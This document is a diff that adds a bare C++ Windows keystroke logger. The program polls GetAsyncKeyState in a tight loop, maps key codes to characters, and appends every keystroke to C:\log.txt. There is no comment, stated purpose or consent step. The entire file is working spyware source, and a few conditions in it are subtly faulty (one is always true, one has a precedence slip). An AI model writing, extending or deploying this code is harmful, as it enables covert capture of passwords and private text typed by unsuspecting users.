@@ -1,0 +1,92 @@
+#include <windows.h>
+#include <Winuser.h>
+#include <string>
+#include <fstream>
+
+
+std::string GetKey(int Key)
+{
+std::string KeyString = "";
+
+if (Key == 8)
+KeyString = "[delete]";
+else if (Key == 13)
+KeyString = "\n";
+else if (Key == 32)
+KeyString = " ";
+else if (Key == VK_PAUSE)
+KeyString = "[PAUSE]";
+else if (Key == VK_CAPITAL)
+KeyString = "[CAPITAL]";
+else if (Key == VK_SHIFT)
+KeyString = "[SHIFT]";
+else if (Key == VK_TAB)
+KeyString = "[TABULATOR]";
+else if (Key == VK_CONTROL)
+KeyString = "[CTRL]";
+else if (Key == VK_ESCAPE)
+KeyString = "[ESCAPE]";
+else if (Key == VK_END)
+KeyString = "[END]";
+else if (Key == VK_HOME)
+KeyString = "[HOME]";
+else if (Key == VK_LEFT)
+KeyString = "[left]";
+else if (Key == VK_RIGHT)
+KeyString = "[right]";
+else if (Key == VK_UP)
+KeyString = "[UP]";
+else if (Key == VK_DOWN)
+KeyString = "[DOWN]";
+else if (Key == VK_SNAPSHOT)
+KeyString = "[SNAPSHOT]";
+else if (Key == VK_NUMLOCK)
+KeyString = "[NUMLOCK]";
+else if (Key == 190 || Key == 110)
+KeyString = ".";
+else if (Key >=96 && Key <= 105)
+KeyString = Key-48;
+else if (Key > 47 && Key < 60)
+KeyString = Key;
+if (Key != VK_LBUTTON || Key != VK_RBUTTON)
+{
+if (Key > 64 && Key < 91)
+{
+if (GetKeyState(VK_CAPITAL))
+KeyString = Key;
+else
+{
+Key = Key + 32;
+KeyString = Key;
+}
+}
+}
+
+return KeyString;
+}
+
+int main()
+{
+std::string Filename = "C:\\log.txt";
+std::string TempString = "";
+std::fstream FStream;
+FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
+
+while(true)
+{
+
+Sleep(5);
+
+for(int i = 8; i < 191; i++)
+{
+if(GetAsyncKeyState(i)&1 ==1)
+{
+TempString = GetKey (i);
+
+FStream.write(TempString.c_str(), TempString.size());
+FStream.close();
+FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
+}
+}
+}
+}
